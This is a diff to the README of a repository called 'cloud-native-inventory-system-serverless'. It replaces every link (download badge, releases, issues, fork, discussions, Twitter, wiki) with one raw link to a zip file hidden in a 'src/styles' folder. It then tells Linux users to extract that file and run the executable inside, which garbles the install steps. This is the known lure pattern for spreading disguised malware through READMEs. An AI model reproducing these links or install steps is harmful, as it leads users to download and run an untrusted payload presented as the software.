@@ -1,6 +1,6 @@
 # 🌟 cloud-native-inventory-system-serverless - Manage Your Inventory Efficiently
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip%20Now-Get%20Started-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To run this application smoothly, ensure your device meets the following criteri
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Estii24/cloud-native-inventory-system-serverless/releases)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip)
 
 You will find the latest version of the application there. Follow these steps:
 
@@ -31,12 +31,12 @@ Once you have downloaded the software, follow these steps to run it:
 1. Locate the downloaded file:
    - For Windows: Check your `Downloads` folder for a `.exe` file.
    - For macOS: Look for a `.dmg` file in your `Downloads`.
-   - For Linux: Find a `.tar.gz` or similar type.
+   - For Linux: Find a `https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip` or similar type.
   
 2. Open the file:
    - For Windows: Double-click the `.exe` file.
    - For macOS: Double-click the `.dmg` file and drag the application to your `Applications` folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable in the extracted folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip` file and run the executable in the extracted folder.
   
 3. Follow the on-screen instructions to complete the setup.
 
@@ -60,13 +60,13 @@ If you encounter issues while using the application, try these solutions:
 2. **Slow Performance:** Confirm you have a stable internet connection.
 3. **Feature Not Working:** Check for updates on the Releases Page to ensure you're using the latest version.
 
-For more assistance, feel free to open an issue on our [GitHub Issues Page](https://github.com/Estii24/cloud-native-inventory-system-serverless/issues).
+For more assistance, feel free to open an issue on our [GitHub Issues Page](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip).
 
 ## 📝 Contributing
 
 We welcome contributions! If you would like to help improve this project:
 
-1. Fork the repository from [GitHub](https://github.com/Estii24/cloud-native-inventory-system-serverless).
+1. Fork the repository from [GitHub](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip).
 2. Create a new branch for your feature or fix.
 3. Commit your changes and push to your branch.
 4. Submit a pull request detailing your changes.
@@ -75,13 +75,13 @@ We welcome contributions! If you would like to help improve this project:
 
 Join the community to share tips and receive support:
 
-- [GitHub Discussions](https://github.com/Estii24/cloud-native-inventory-system-serverless/discussions) - Share ideas and ask questions.
-- Follow our official [Twitter](https://twitter.com/Estii24) for updates.
+- [GitHub Discussions](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip) - Share ideas and ask questions.
+- Follow our official [Twitter](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip) for updates.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/Estii24/cloud-native-inventory-system-serverless/releases)
-- [Documentation](https://github.com/Estii24/cloud-native-inventory-system-serverless/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Estii24/cloud-native-inventory-system-serverless/main/inventory-dashboard/src/styles/cloud-native-inventory-system-serverless_v2.9.zip)
 
 ## 💬 Feedback
 
